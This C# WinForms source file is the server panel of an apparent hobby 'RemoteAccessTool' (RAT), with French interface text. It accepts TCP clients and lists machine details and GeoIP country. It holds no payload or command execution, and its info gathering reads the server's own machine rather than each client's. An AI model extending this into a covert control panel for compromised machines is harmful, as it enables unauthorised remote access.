using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MaxMind.GeoIP2;
using MaxMind.GeoIP2.Exceptions;
using RemoteAccessTool.Properties;
using MaxMind.GeoIP2.Model;
using System.IO;
using System.Diagnostics;
using MaxMind.Db;


namespace RemoteAccessTool
{
    public partial class RAT : Form
    {

        private TcpListener serverListener;
        private Thread serverThread;
        private List<TcpClient> connectedClients = new List<TcpClient>();
        private bool isServerRunning = false;
        private bool isServerStopping = false;
        private object clientsLock = new object();
        private SemaphoreSlim serverStopSemaphore = new SemaphoreSlim(1, 1);


        public RAT()
        {
            InitializeComponent();
        }

        private void BtnStart_Click(object sender, EventArgs e)
        {
            try
            {
                if (TxtIp.Text == string.Empty || TxtPort.Text == string.Empty)
                {
                    LabelInfo.Text = "Veuillez entrer une IP et un Port valide, s'il vous plaît.";
                    return;
                }

                if (!isServerRunning)
                {
                    MultiClient();
                    LabelInfo.Text = "Serveur démarré.";
                    BtnStart.Text = "STOP";
                    isServerRunning = true;
                }
                else
                {
                    try
                    {
                        ServerStop();
                        LabelInfo.Text = "Serveur arrêté.";
                        BtnStart.Text = "START";
                        isServerRunning = false;
                    }
                    catch(Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }

                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }


        private void StartServer()
        {

            MessageBox.Show("Serveur démarré. En attente de connexions...");

            while (!isServerStopping)
            {
                if (serverListener.Pending())
                {
                    TcpClient client = serverListener.AcceptTcpClient();

                    lock (clientsLock)
                    {
                        connectedClients.Add(client);

                    }

                    Thread clientThread = new Thread(() => HandleClient(client));
                    clientThread.Start();
                }
                else
                {
                    Thread.Sleep(100);
                }
            }

            serverListener.Stop();
        }

        private void HandleClient(object clientobj)
        {
            TcpClient client = (TcpClient)clientobj;

            MessageBox.Show("Nouvelle connexion cliente acceptée.");

            GetInfos();

            NetworkStream stream = client.GetStream();

            byte[] buffer = new byte[1024];
            int bytesRead;

            try
            {
                while (!isServerStopping && (bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                    MessageBox.Show("Client : " + message);

                    byte[] response = Encoding.ASCII.GetBytes("Message reçu par le serveur.");
                    stream.Write(response, 0, response.Length);
                }
            }
            catch (IOException ex)
            {
                // Gérer l'exception lié à l'arrêt du serveur
                if (isServerStopping)
                {
                    client.Close();
                    RemoveClient(client);
                }
                else
                {
                    // Gérer d'autres exceptions d'entrée/sortie
                    MessageBox.Show("Erreur lors de la lecture des données du client : " + ex.Message);
                }
            }
            catch (Exception ex)
            {
                // Gérer les autres exceptions
                MessageBox.Show("Erreur lors de la lecture des données du client : " + ex.Message);
            }
            finally
            {
                client.Close();
                MessageBox.Show("Connexion client fermée");
                RemoveClient(client);
            }
        }

        private void MultiClient()
        {
            try
            {
                serverListener = new TcpListener(IPAddress.Parse(TxtIp.Text), int.Parse(TxtPort.Text));
                serverThread = new Thread(StartServer);
                serverThread.Start();
                serverListener.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }

        private void ServerStop()
        {
            serverStopSemaphore.Wait();

            try
            {
                // Fermer toutes les connexions
                lock (clientsLock)
                {
                    foreach (TcpClient client in connectedClients)
                    {
                        client.Close();
                    }
                    connectedClients.Clear();
                }

                // Arrêter le thread du serveur
                isServerStopping = true;
                serverListener.Stop();
            }
            finally
            {
                serverStopSemaphore.Release();
            }
        }


        private void RemoveClient(TcpClient client)
        {

            connectedClients.Remove(client);


        }

        private int clientNumber = 0;
        private void GetInfos()
        {
            clientNumber++;
            string name = Dns.GetHostName();
            string windowEnCours = "rien";
            string ipClient = Dns.GetHostByName(name).AddressList[0].ToString();

            ListViewItem item = new ListViewItem(clientNumber.ToString());

            item.SubItems.Add(name);
            item.SubItems.Add(GetOSInfos("Win32_OperatingSystem", "Caption"));
            item.SubItems.Add(GetArch());
            item.SubItems.Add(ipClient);
            item.SubItems.Add("");
            item.SubItems.Add(GetTotalRAM());
            item.SubItems.Add(GetCpuInfos());
            item.SubItems.Add("");
            item.SubItems.Add("");

            string tempFilePath = Path.GetTempFileName(); // Crée un fichier temporaire pour stocker la ressource
            File.WriteAllBytes(tempFilePath, Properties.Resources.GeoLite2_City); // Enregistre la ressource dans le fichier temporaire

            try
            {
                using (var reader = new DatabaseReader(tempFilePath))
                {
                    string ip = GetIP();
                    var data = reader.City(ip);
                    item.SubItems.Add(data.Country.IsoCode);
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                item.SubItems.Add("Unknown");
            }
            AddItemToListConnection(item);
            File.Delete(tempFilePath); // Supprime le fichier temporaire

        }



        private void AddItemToListConnection(ListViewItem item)
        {
            if (ListConnection.InvokeRequired)
            {
                // Utiliser Invoke pour exécuter le code sur le thread approprié
                ListConnection.Invoke(new Action<ListViewItem>(AddItemToListConnection), item);
            }
            else
            {
                // Ajouter l'élément à ListConnection.Items
                ListConnection.Items.Add(item);
            }
        }

        private string GetOSInfos(string hwclass, string syntax)
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM " + hwclass);

            foreach (ManagementObject ms in mos.Get())
            {
                if (ms[syntax] != null)
                {
                    return ms[syntax].ToString();
                }
            }

            return "";
        }


        private string GetCpuInfos()
        {
            RegistryKey proc_name = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadWriteSubTree);

            if(proc_name != null)
            {
                return proc_name.GetValue("ProcessorNameString").ToString();
            }
            return "";

        }

        private string GetTotalRAM()
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem");

            foreach (ManagementObject ms in mos.Get())
            {
                ulong totalRAMBytes = Convert.ToUInt64(ms["TotalPhysicalMemory"]);
                ulong totalRAMGB = totalRAMBytes / (1024 * 1024 * 1024); // Convertir en gigaoctets

                return totalRAMGB.ToString() + " GB";
            }

            return "";
        }


        private string GetArch()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Architecture FROM Win32_Processor");
                ManagementObjectCollection collection = searcher.Get();

                foreach (ManagementObject obj in collection)
                {
                    UInt16 architecture = (UInt16)obj["Architecture"];

                    if (architecture == 0)
                    {
                       return "x86";
                    }
                    else if (architecture == 9)
                    {
                        return "x64";
                    }
                    else if (architecture == 6)
                    {
                        return "Itanium-based";
                    }
                    else
                    {
                        return "Unknown";
                    }
                }
            }
            catch (ManagementException ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
            return "";
        }

        private static string GetIP()
        {
            string real = Dns.GetHostName();
            string ip = Dns.GetHostByName(real).AddressList[0].ToString();

            return ip;

        }

    }
    
}

